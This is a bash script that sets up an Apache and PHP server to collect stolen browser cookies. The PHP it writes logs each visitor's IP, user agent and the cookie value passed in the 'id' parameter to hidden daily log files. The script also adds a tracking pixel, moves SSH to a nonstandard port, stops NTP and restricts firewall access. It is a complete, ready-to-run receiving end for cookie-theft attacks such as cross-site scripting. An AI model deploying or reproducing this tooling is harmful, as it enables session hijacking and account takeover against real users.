######## EDIT THIS 
# Set allowed IPs to interact with SSH port
declare -a ALLOW_IP=("127.0.0.1","x.x.x.x")
					 
######## DO NOT EDIT ANYTHING AFTER THIS LINE UNLESS YOU KNOW WHAT YOU ARE DOING

echo "[+] changing SSH port to 50055"
# change SSH port 
sed -i 's/^#.*Port .*/Port 50055/' /etc/ssh/sshd_config
echo "[+] installing apache + PHP"
# install apache + php
apt-get -y update && apt-get install -y apache2 php php-cli
echo "[+] create directory for our cookie sessions"
# create file to store our sessions
mkdir /var/www/html/cookies/
echo "[+] grant www-data permissions over cookies"
# change perms on folder
chown -R www-data:www-data /var/www/html/cookies/
echo "[+] disable ipv6"
# disable ipv6
sysctl -w net.ipv6.conf.all.disable_ipv6=1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 
echo "[+] stoping NTP (in case its there)"
# stop NTP
/etc/init.d/ntp stop
# restart SSH (you will need to restart session anyway)
/etc/init.d/ssh restart

# insert logger into right place into /var/www/html/index.php:

cat > /var/www/html/index.php << EOL
<?php
        ini_set('display_errors', 0);
        error_reporting(E_ALL);
		
        \$ipaddress = \$_SERVER['REMOTE_ADDR'];
        \$webpage = \$_SERVER['SCRIPT_NAME'];
        \$timestamp = date('d/m/Y H:i:s');
        \$browser = \$_SERVER['HTTP_USER_AGENT'];
        \$cookie = (isset(\$_GET['id']) ? \$_GET['id'] : 'NO_COOKIE');
		
        \$data = "[{\$timestamp}] \$ipaddress\t\$webpage\t\$browser\t\$cookie" . PHP_EOL . PHP_EOL;
        \$f = "./cookies/cookielog_" . date("Ymd") . ".txt";
        \$ret = file_put_contents(\$f, \$data, FILE_APPEND);
        if(\$ret === FALSE){
		#redirect on fail as fail-safe mechanism
		header('Location: http://www.google.com/');
		}else{
        #echo "Finished";
		}
?>       
EOL

#droping single pixel to tracking dir in case we need it
echo "[+] adding tracking pixel in case we need it"
echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAANSURBVBhXY/j///9/AAn7A/0FQ0XKAAAAAElFTkSuQmCC | base64 -d > /var/www/html/pixel.png

# enable mod_rewrite
echo "[+] enabling mod_rewrite"
a2enmod rewrite


#change AllowOverwrite directive so we can use our .htaccess files: 
echo "[+] changing AllowOverride directive to allow for use of .htaccess files"
sed -i 's/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf

# rewrite rules to hide .php extension in /var/www/html/.htaccess:
echo "[+] creating /var/www/html/.htaccess file"
cat > /var/www/html/.htaccess << EOL
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^([^\.]+)\$ \$1.php [NC,L]
EOL

# deny access to cookies folder (we only want apache to write there but not for people to browse)
echo "[+] creating /var/www/html/cookies/.htaccess file"
cat > /var/www/html/cookies/.htaccess << EOL
Options All -Indexes
Deny From All
EOL

# restart apache
echo "[+] restarting apache service"
systemctl restart apache2


echo "[+] adding IPTABLE rules"
# IPTABLES setup
# Flushing all rules
iptables -F
iptables -X

# add current SSH to allowed list, it will filter new connections
iptables -I INPUT 1 -m state -p tcp --dport 22 --state ESTABLISHED,RELATED -j ACCEPT

# Setting default policies:
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

#drop invalid packets
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP

#this should prevent us from killing access on output
iptables -A OUTPUT -p tcp --sport 50055 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Allow unlimited traffic on loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Exceptions to default policy to allow 443/80 
iptables -A INPUT -p tcp --dport 80 -j ACCEPT       # HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT      # HTTPS

#sort out SSH access 
for i in "${ALLOW_IP[@]}"
do
   iptables -A INPUT -p tcp -s $i --dport 50055 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
   echo "[+] SSH - Allowed IP: $i"
done
